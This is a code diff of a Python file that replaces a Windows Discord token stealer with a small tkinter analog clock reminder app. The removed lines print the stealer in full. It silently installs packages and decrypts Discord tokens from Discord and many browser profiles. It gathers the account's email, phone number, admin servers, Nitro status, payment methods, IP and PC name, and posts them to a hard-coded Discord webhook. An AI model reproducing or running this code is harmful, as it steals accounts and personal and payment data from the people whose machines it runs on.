@@ -1,213 +1,139 @@
+import time
+import tkinter as tk
+import pygame
 import os
-if os.name != "nt":
-    exit()
-import subprocess
-import sys
-import json
-import urllib.request
-import re
-import base64
-import datetime
+import math
 
-def install_import(modules):
-    for module, pip_name in modules:
+class ClockReminderApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Clock Reminder")
+        self.root.configure(bg='black')
+        self.root.geometry("300x300")  # Initial size
+        self.root.resizable(True, True)  # Allow resizing
+        self.root.attributes('-topmost', True)  # Keep window on top
+
+        # Initialize pygame mixer
+        pygame.mixer.init()
+        self.sound_file = "default_beep.mp3"  # Default sound file
+        self.reminded_minutes = set()  # Track reminded minutes
+
+        # Create canvas for analog clock
+        self.canvas = tk.Canvas(root, bg='black', highlightthickness=0)
+        self.canvas.pack(fill='both', expand=True)
+
+        # Bind resize event to redraw clock
+        self.canvas.bind("<Configure>", self.resize_clock)
+
+        # Initialize clock elements
+        self.clock_center = None
+        self.clock_radius = None
+        self.hour_hand = None
+        self.minute_hand = None
+
+        # Force initial draw after a short delay to ensure canvas is ready
+        self.root.after(100, self.initial_draw)
+
+        # Start clock and reminder updates
+        self.update_clock()
+        self.check_reminder()
+
+    def play_sound(self):
+        """Play the reminder sound"""
         try:
-            __import__(module)
-        except ImportError:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            os.execl(sys.executable, sys.executable, *sys.argv)
+            pygame.mixer.music.load(self.sound_file)
+            pygame.mixer.music.play()
+        except pygame.error as e:
+            print(f"Cannot play audio: {e}. Ensure default_beep.mp3 is a valid .mp3 file.")
 
-install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+    def draw_clock(self, width, height):
+        """Draw the analog clock with gold hour and minute hands"""
+        self.canvas.delete("all")  # Clear previous drawings
 
-import win32crypt
-from Crypto.Cipher import AES
+        # Calculate clock center and radius
+        self.clock_center = (width / 2, height / 2)
+        self.clock_radius = min(width, height) * 0.4
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-    'Discord': ROAMING + '\\discord',
-    'Discord Canary': ROAMING + '\\discordcanary',
-    'Lightcord': ROAMING + '\\Lightcord',
-    'Discord PTB': ROAMING + '\\discordptb',
-    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
-    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
-    'Amigo': LOCAL + '\\Amigo\\User Data',
-    'Torch': LOCAL + '\\Torch\\User Data',
-    'Kometa': LOCAL + '\\Kometa\\User Data',
-    'Orbitum': LOCAL + '\\Orbitum\\User Data',
-    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
-    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
-    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
-    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
-    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
-    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
-    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
-    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
-    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
-    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
-}
+        # Draw clock face (black background, no border or numbers)
+        self.canvas.create_oval(
+            self.clock_center[0] - self.clock_radius,
+            self.clock_center[1] - self.clock_radius,
+            self.clock_center[0] + self.clock_radius,
+            self.clock_center[1] + self.clock_radius,
+            fill='black', outline='black'
+        )
 
-def getheaders(token=None):
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
-    }
+        # Get current time
+        current_time = time.localtime()
+        hour = current_time.tm_hour % 12
+        minute = current_time.tm_min
 
-    if token:
-        headers.update({"Authorization": token})
+        # Calculate angles for hour and minute hands
+        hour_angle = math.radians((hour % 12 + minute / 60) * 30 - 90)
+        minute_angle = math.radians(minute * 6 - 90)
 
-    return headers
+        # Hour hand (shorter, thicker, gold)
+        hour_hand_length = self.clock_radius * 0.5
+        hour_x = self.clock_center[0] + hour_hand_length * math.cos(hour_angle)
+        hour_y = self.clock_center[1] + hour_hand_length * math.sin(hour_angle)
+        self.hour_hand = self.canvas.create_line(
+            self.clock_center[0], self.clock_center[1], hour_x, hour_y,
+            fill='gold', width=4
+        )
 
-def gettokens(path):
-    path += "\\Local Storage\\leveldb\\"
-    tokens = []
+        # Minute hand (longer, thinner, gold)
+        minute_hand_length = self.clock_radius * 0.8
+        minute_x = self.clock_center[0] + minute_hand_length * math.cos(minute_angle)
+        minute_y = self.clock_center[1] + minute_hand_length * math.sin(minute_angle)
+        self.minute_hand = self.canvas.create_line(
+            self.clock_center[0], self.clock_center[1], minute_x, minute_y,
+            fill='gold', width=2
+        )
 
-    if not os.path.exists(path):
-        return tokens
+    def initial_draw(self):
+        """Force initial clock draw after canvas is ready"""
+        width = self.canvas.winfo_width()
+        height = self.canvas.winfo_height()
+        if width > 1 and height > 1:  # Ensure canvas is initialized
+            self.draw_clock(width, height)
 
-    for file in os.listdir(path):
-        if not file.endswith(".ldb") and file.endswith(".log"):
-            continue
+    def resize_clock(self, event):
+        """Redraw clock on window resize"""
+        self.draw_clock(event.width, event.height)
 
-        try:
-            with open(f"{path}{file}", "r", errors="ignore") as f:
-                for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                        tokens.append(values)
-        except PermissionError:
-            continue
+    def update_clock(self):
+        """Update the analog clock display"""
+        width = self.canvas.winfo_width()
+        height = self.canvas.winfo_height()
+        if width > 1 and height > 1:  # Ensure canvas is initialized
+            self.draw_clock(width, height)
+        self.root.after(1000, self.update_clock)  # Update every second
 
-    return tokens
-    
-def getkey(path):
-    with open(path + f"\\Local State", "r") as file:
-        key = json.loads(file.read())['os_crypt']['encrypted_key']
-        file.close()
+    def check_reminder(self):
+        """Check if a reminder is needed"""
+        current_time = time.localtime()
+        current_hour = current_time.tm_hour
+        current_minute = current_time.tm_min
 
-    return key
+        # Reset reminded_minutes when entering a new hour
+        if current_minute == 0 and len(self.reminded_minutes) > 0:
+            self.reminded_minutes.clear()
 
-def getip():
-    try:
-        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
-            return json.loads(response.read().decode()).get("ip")
-    except:
-        return "None"
+        # Check for reminders at 0, 15, 30, 45 minutes
+        if current_minute in [0, 15, 30, 45] and current_minute not in self.reminded_minutes:
+            print(f"Reminder: {current_hour:02d}:{current_minute:02d}")
+            self.play_sound()
+            self.reminded_minutes.add(current_minute)
 
-def main():
-    checked = []
-
-    for platform, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
-
-        for token in gettokens(path):
-            token = token.replace("\\", "") if token.endswith("\\") else token
-
-            try:
-                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
-                if token in checked:
-                    continue
-                checked.append(token)
-
-                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
-                if res.getcode() != 200:
-                    continue
-                res_json = json.loads(res.read().decode())
-
-                badges = ""
-                flags = res_json['flags']
-                if flags == 64 or flags == 96:
-                    badges += ":BadgeBravery: "
-                if flags == 128 or flags == 160:
-                    badges += ":BadgeBrilliance: "
-                if flags == 256 or flags == 288:
-                    badges += ":BadgeBalance: "
-
-                params = urllib.parse.urlencode({"with_counts": True})
-                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
-                guilds = len(res)
-                guild_infos = ""
-
-                for guild in res:
-                    if guild['permissions'] & 8 or guild['permissions'] & 32:
-                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
-                        vanity = ""
-
-                        if res["vanity_url_code"] != None:
-                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
-
-                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
-                if guild_infos == "":
-                    guild_infos = "No guilds"
-
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
-                has_nitro = False
-                has_nitro = bool(len(res) > 0)
-                exp_date = None
-                if has_nitro:
-                    badges += f":BadgeSubscriber: "
-                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
-
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
-                available = 0
-                print_boost = ""
-                boost = False
-                for id in res:
-                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
-                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                        print_boost += f"ㅤ- Available now\n"
-                        available += 1
-                    else:
-                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
-                    boost = True
-                if boost:
-                    badges += f":BadgeBoost: "
-
-                payment_methods = 0
-                type = ""
-                valid = 0
-                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
-                    if x['type'] == 1:
-                        type += "CreditCard "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-                    elif x['type'] == 2:
-                        type += "PayPal "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-
-                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
-                embed_user = {
-                    'embeds': [
-                        {
-                            'title': f"**New user data: {res_json['username']}**",
-                            'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
-                            'color': 3092790,
-                            'footer': {
-                                'text': "Made by Astraa ・ https://github.com/astraadev"
-                            },
-                            'thumbnail': {
-                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
-                            }
-                        }
-                    ],
-                    "username": "Grabber",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
-                }
-
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1415314450499637332/4AjN5rriRW0wn_LKHvsy-C_MlPHf55VvFfV0VbJiskIVzmPzDIx4z8yOTT3fCqHphdoA', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
-            except urllib.error.HTTPError or json.JSONDecodeError:
-                continue
-            except Exception as e:
-                print(f"ERROR: {e}")
-                continue
+        # Check every second
+        self.root.after(1000, self.check_reminder)
 
 if __name__ == "__main__":
-    main()
+    # Check for default sound file
+    if not os.path.exists("default_beep.mp3"):
+        print("Error: default_beep.mp3 not found. Please place a valid .mp3 file in the directory.")
+        exit(1)
+
+    root = tk.Tk()
+    app = ClockReminderApp(root)
+    root.mainloop()
